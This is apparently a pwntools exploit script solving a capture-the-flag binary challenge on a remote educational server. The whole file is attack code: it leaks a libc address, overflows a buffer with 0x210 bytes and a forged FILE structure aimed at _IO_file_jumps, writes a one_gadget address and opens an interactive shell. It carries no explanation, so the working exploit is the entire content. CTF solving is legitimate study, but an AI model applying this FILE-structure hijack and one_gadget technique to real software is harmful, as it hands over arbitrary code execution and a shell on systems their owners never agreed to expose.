from pwn import *

context.terminal = ['tmux', 'split', '-h']
context.binary = "./chal"

# p = process("./chal")
p = remote("edu-ctf.zoolab.org", 30217)

l = ELF("../libc.so.6")

p.recvuntil("0x")

libc = int(p.recvline(), base=16) - l.sym['printf']
_IO_file_jumps = libc + l.sym['_IO_file_jumps']
print(hex(libc), hex(_IO_file_jumps))


p.sendlineafter(">", "1")

p.sendlineafter(">", "2")

flag = 0

payload = flat(
    flag, 0,
    0, 0,
    0, 0,
    0, _IO_file_jumps + 0x20,
    _IO_file_jumps + 0x28, 0,
    0, 0,
    0, 0,
    0
)
p.sendlineafter("data>", b'A'*0x210+payload)

one_gadget = libc + 0xe6c81

p.sendlineafter(">", "4")
p.sendline(p64(one_gadget))

# gdb.attach(p)

p.interactive()